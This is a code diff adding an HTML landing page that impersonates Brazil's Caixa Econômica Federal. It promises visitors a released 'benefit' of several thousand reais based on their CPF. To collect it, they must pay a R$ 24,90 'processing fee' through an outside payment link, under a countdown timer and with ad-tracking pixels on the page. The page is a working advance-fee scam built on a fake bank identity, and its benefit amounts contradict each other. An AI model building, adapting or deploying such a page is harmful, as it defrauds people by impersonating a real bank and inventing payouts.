@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <script>
+        window.pixelId = "67ef67b0655738af4b8dbdd8";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <!-- Meta Pixel Code -->
+    <script>
+        !function (f, b, e, v, n, t, s) {
+            if (f.fbq) return; n = f.fbq = function () {
+                n.callMethod ?
+                    n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+            };
+            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
+            n.queue = []; t = b.createElement(e); t.async = !0;
+            t.src = v; s = b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t, s)
+        }(window, document, 'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+        fbq('init', '2853456888176959');
+        fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1" /></noscript>
+    <!-- End Meta Pixel Code -->
+    <script src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js" async defer></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa Econômica Federal - Benefício Disponível</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids data-utmify-ignore-iframe
+        async defer></script>
+    <script>
+        window.pixelId = "68312b2ad323906a4dbab27f";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'caixa-blue': '#005CA9',
+                        'caixa-dark-blue': '#004a87',
+                        'caixa-orange': '#F39200',
+                        'caixa-green': '#00A651',
+                        'caixa-light-blue': '#E1EFFE'
+                    },
+                    fontFamily: {
+                        'montserrat': ['Montserrat', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @font-face {
+            font-family: 'FuturaBold';
+            src: url('fonts/futuraBold.eot');
+            src: url('fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+                url('fonts/futuraBold.woff') format('woff'),
+                url('fonts/futuraBold.ttf') format('truetype'),
+                url('fonts/futuraBold.svg#futuraBold') format('svg');
+            font-weight: bold;
+            font-style: normal;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f5f7fa;
+        }
+
+        .title-bold,
+        h1,
+        h2,
+        h3,
+        button {
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif;
+        }
+
+        .gradient-blue {
+            background: linear-gradient(135deg, #004a87 0%, #005CA9 100%);
+        }
+
+        .gradient-green {
+            background: linear-gradient(135deg, #005CA9 0%, #0277bd 100%);
+        }
+
+        .gradient-orange {
+            background: linear-gradient(135deg, #e98300 0%, #F39200 100%);
+        }
+
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.3) 50%, rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
+        .caixa-topbar {
+            height: 5px;
+            background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+            width: 100%;
+        }
+
+        @keyframes shine {
+            0% {
+                transform: translateX(-100%) rotate(30deg);
+            }
+
+            100% {
+                transform: translateX(100%) rotate(30deg);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 92, 169, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 10px rgba(0, 92, 169, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 92, 169, 0);
+            }
+        }
+
+        @media (max-width: 640px) {
+            .text-3xl {
+                font-size: 1.75rem;
+            }
+
+            .text-4xl {
+                font-size: 2rem;
+            }
+
+            .text-2xl {
+                font-size: 1.5rem;
+            }
+
+            .p-8 {
+                padding: 1.5rem;
+            }
+
+            .py-5 {
+                padding-top: 1rem;
+                padding-bottom: 1rem;
+            }
+
+            .px-10 {
+                padding-left: 1.5rem;
+                padding-right: 1.5rem;
+            }
+
+            .rounded-xl {
+                border-radius: 0.75rem;
+            }
+
+            .h-10,
+            .w-10 {
+                height: 2.25rem;
+                width: 2.25rem;
+            }
+        }
+    </style>
+</head>
+
+<body class="font-montserrat">
+    <div class="caixa-topbar"></div>
+    <!-- Barra superior - Estilo moderno da Caixa -->
+    <header class="bg-white shadow-lg">
+        <div class="max-w-6xl mx-auto px-4 py-3 flex justify-between items-center">
+            <div class="flex items-center">
+                <img src="images/logo.png" alt="Logo Caixa" class="h-10 w-auto object-contain">
+                <div class="hidden md:flex ml-8 text-caixa-blue text-sm">
+                    <span class="border-r border-gray-300 pr-4 mr-4">Portal de Serviços</span>
+                    <span>Área do Cliente</span>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4">
+                <div class="hidden md:flex items-center text-caixa-blue text-sm">
+                    <i class="fas fa-shield-alt mr-2"></i>
+                    <span>Ambiente Seguro</span>
+                </div>
+                <div class="bg-caixa-blue rounded-full px-4 py-1 text-white text-sm flex items-center">
+                    <i class="fas fa-user-circle mr-2"></i>
+                    <span>Acesso</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Barra de navegação secundária -->
+    <div class="bg-white border-b border-gray-200 shadow-sm">
+        <div class="max-w-6xl mx-auto px-4 py-3">
+            <div class="flex items-center text-sm text-gray-600">
+                <a href="#" class="hover:text-caixa-blue">Início</a>
+                <i class="fas fa-chevron-right mx-2 text-xs text-gray-400"></i>
+                <a href="#" class="hover:text-caixa-blue">Serviços</a>
+                <i class="fas fa-chevron-right mx-2 text-xs text-gray-400"></i>
+                <span class="text-caixa-blue font-medium">Benefício</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Banner principal -->
+    <div class="bg-caixa-blue relative overflow-hidden">
+        <div class="absolute inset-0 opacity-10">
+            <div class="absolute inset-0"
+                style="background-image: url('https://www.gov.br/pt-br/imagens-banner/banner-saiba-mais-janela.png'); background-size: cover; background-position: center;">
+            </div>
+        </div>
+        <div class="max-w-6xl mx-auto px-4 py-12 relative z-10">
+            <div class="flex flex-col md:flex-row items-center">
+                <div class="w-full md:w-2/3 text-white">
+                    <div class="inline-block bg-caixa-orange text-white font-bold px-3 py-1 rounded-md text-sm mb-4">
+                        BENEFÍCIO ADICIONAL
+                    </div>
+                    <h1 class="text-3xl md:text-4xl font-bold mb-4 leading-tight title-bold">Novo Benefício Disponível
+                    </h1>
+                    <p class="text-xl opacity-90 mb-6">Parceria Especial Caixa e Serasa</p>
+                    <div class="flex items-center mb-4">
+                        <div class="h-10 w-10 rounded-full bg-green-500/30 flex items-center justify-center mr-4">
+                            <i class="fas fa-check-circle text-green-400"></i>
+                        </div>
+                        <p class="text-white/90">Seu benefício de <strong>R$ 5.960,50</strong> já foi liberado</p>
+                    </div>
+                    <div class="flex items-center">
+                        <div
+                            class="h-10 w-10 rounded-full bg-white/20 flex items-center justify-center mr-4 flex-shrink-0">
+                            <i class="fas fa-plus-circle text-white"></i>
+                        </div>
+                        <p class="text-white/80">Analisamos seu CPF e você tem direito a um benefício adicional</p>
+                    </div>
+                </div>
+                <div class="w-full md:w-1/3 mt-8 md:mt-0 flex justify-center">
+                    <div class="bg-white/10 backdrop-blur-sm p-6 rounded-lg border border-white/20 text-center">
+                        <div class="text-white mb-2">Valor adicional disponível:</div>
+                        <div class="text-4xl font-bold text-white mb-2 title-bold">R$ 7.854,63</div>
+                        <div class="text-white/70 text-sm">Disponível para liberação imediata</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Container principal -->
+    <main class="max-w-6xl mx-auto bg-white shadow-xl rounded-lg overflow-hidden my-8">
+        <!-- Alerta de confirmação -->
+        <div class="gradient-green p-4 text-white flex items-center">
+            <div class="flex-shrink-0 mr-4">
+                <div class="h-12 w-12 rounded-full bg-white/20 flex items-center justify-center">
+                    <i class="fas fa-check-circle text-white text-xl"></i>
+                </div>
+            </div>
+            <div>
+                <h3 class="font-bold text-lg">Solicitação Processada</h3>
+                <p class="opacity-90">Seu benefício inicial foi processado com sucesso. Você tem um benefício adicional
+                    disponível.</p>
+            </div>
+        </div>
+
+        <!-- Conteúdo principal -->
+        <div class="p-8">
+            <h2 class="text-2xl font-bold text-caixa-blue mb-6 title-bold">Benefício Adicional Disponível</h2>
+
+            <div class="bg-caixa-light-blue p-4 rounded-md border border-caixa-blue/20 mb-6">
+                <div class="flex items-start">
+                    <div class="mr-3 mt-1 text-caixa-blue">
+                        <i class="fas fa-info-circle text-xl"></i>
+                    </div>
+                    <div>
+                        <h4 class="font-bold text-caixa-blue">Informação Importante</h4>
+                        <p class="text-gray-700">A Caixa identificou que você tem direito a um benefício adicional no
+                            valor de R$ 7.000,00. Este valor está disponível para liberação imediata após confirmação.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Cards de benefícios -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+                <div
+                    class="bg-white p-6 rounded-xl border border-gray-200 shadow-sm transition-all duration-300 card-hover">
+                    <div class="h-12 w-12 rounded-full gradient-blue flex items-center justify-center mb-4 text-white">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3 class="text-lg font-bold mb-2 text-caixa-blue title-bold">Liberação Rápida</h3>
+                    <p class="text-gray-600">Receba seu benefício em poucas horas após a confirmação.</p>
+                </div>
+                <div
+                    class="bg-white p-6 rounded-xl border border-gray-200 shadow-sm transition-all duration-300 card-hover">
+                    <div
+                        class="h-12 w-12 rounded-full gradient-orange flex items-center justify-center mb-4 text-white">
+                        <i class="fas fa-check-double"></i>
+                    </div>
+                    <h3 class="text-lg font-bold mb-2 text-caixa-blue title-bold">Garantia Caixa</h3>
+                    <p class="text-gray-600">Benefício garantido pela Caixa Econômica Federal.</p>
+                </div>
+                <div
+                    class="bg-white p-6 rounded-xl border border-gray-200 shadow-sm transition-all duration-300 card-hover">
+                    <div class="h-12 w-12 rounded-full gradient-blue flex items-center justify-center mb-4 text-white">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3 class="text-lg font-bold mb-2 text-caixa-blue title-bold">Processo Seguro</h3>
+                    <p class="text-gray-600">Seus dados estão protegidos durante todo o processo.</p>
+                </div>
+            </div>
+
+            <!-- Detalhes do benefício -->
+            <div class="bg-gray-50 p-6 rounded-lg mb-8 border border-gray-200">
+                <h3 class="text-xl font-bold mb-4 text-caixa-blue title-bold">Detalhes do Benefício</h3>
+                <div class="space-y-4">
+                    <div class="flex justify-between pb-2 border-b border-gray-200">
+                        <span class="text-gray-600">Valor do Benefício:</span>
+                        <span class="font-bold text-caixa-blue">R$ 7.000,00</span>
+                    </div>
+                    <div class="flex justify-between pb-2 border-b border-gray-200">
+                        <span class="text-gray-600">Taxa de Processamento:</span>
+                        <span class="font-bold text-caixa-orange">R$ 24,90</span>
+                    </div>
+                    <div class="flex justify-between pb-2 border-b border-gray-200">
+                        <span class="text-gray-600">Tempo de Liberação:</span>
+                        <span class="font-bold text-green-600">24 horas</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-600">Validade da Oferta:</span>
+                        <span class="font-bold text-red-600">23:59:42</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botão de ação -->
+            <div class="text-center">
+                <p class="text-gray-600 mb-4">Para receber seu benefício adicional, é necessário confirmar seus dados e
+                    efetuar o pagamento da taxa de processamento.</p>
+                <button onclick="checkout(event)"
+                    class="bg-caixa-blue hover:bg-caixa-dark-blue text-white py-5 px-10 rounded-full shadow-lg font-bold text-lg transition-all duration-300 btn-shine pulse title-bold">
+                    LIBERAR MEU BENEFÍCIO AGORA
+                </button>
+                <p class="text-gray-500 text-sm mt-4">
+                    <i class="fas fa-lock mr-1"></i> Seus dados estão protegidos com criptografia SSL
+                </p>
+            </div>
+        </div>
+
+        <!-- Rodapé de informações -->
+        <div class="bg-gray-50 p-6 border-t border-gray-200">
+            <div class="max-w-4xl mx-auto text-center">
+                <h4 class="font-bold text-gray-700 mb-3 title-bold">Perguntas Frequentes</h4>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm text-left">
+                    <div>
+                        <p class="font-semibold text-caixa-blue mb-1">Como funciona esse benefício?</p>
+                        <p class="text-gray-600">Este é um benefício adicional disponibilizado pela Caixa para clientes
+                            selecionados com base na análise de CPF.</p>
+                    </div>
+                    <div>
+                        <p class="font-semibold text-caixa-blue mb-1">Quanto tempo leva para receber?</p>
+                        <p class="text-gray-600">Após a confirmação e pagamento da taxa, o benefício é liberado em até
+                            24 horas úteis.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Rodapé -->
+    <footer class="bg-gray-100 border-t border-gray-200">
+        <div class="max-w-6xl mx-auto px-4 py-8">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-4 md:mb-0">
+                    <img src="images/logo.png" alt="Logo Caixa" class="h-10">
+                </div>
+                <div class="text-sm text-gray-600">
+                    © 2023 Caixa Econômica Federal. Todos os direitos reservados.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function checkout(event) {
+            event.preventDefault();
+            // Pega os parâmetros UTM da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+
+            // Mantém apenas os parâmetros UTM e outros relevantes
+            for (const [key, value] of urlParams.entries()) {
+                if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                    utmParams[key] = value;
+                }
+            }
+
+            // Adiciona os novos parâmetros
+            utmParams.from_upsell = '4';
+            utmParams.valor = '2743';
+
+            // Mantém o parâmetro transaction se existir
+            if (urlParams.has('transaction')) {
+                utmParams.transaction = urlParams.get('transaction');
+            }
+
+            // Constrói a nova URL
+            const newParams = new URLSearchParams(utmParams);
+            var currentUrlParams = window.location.search;
+            window.location.href = "https://go.zeroonepay.com.br/8onm25ynty" + currentUrlParams;
+        }
+    </script>
+</body>
+
+</html>
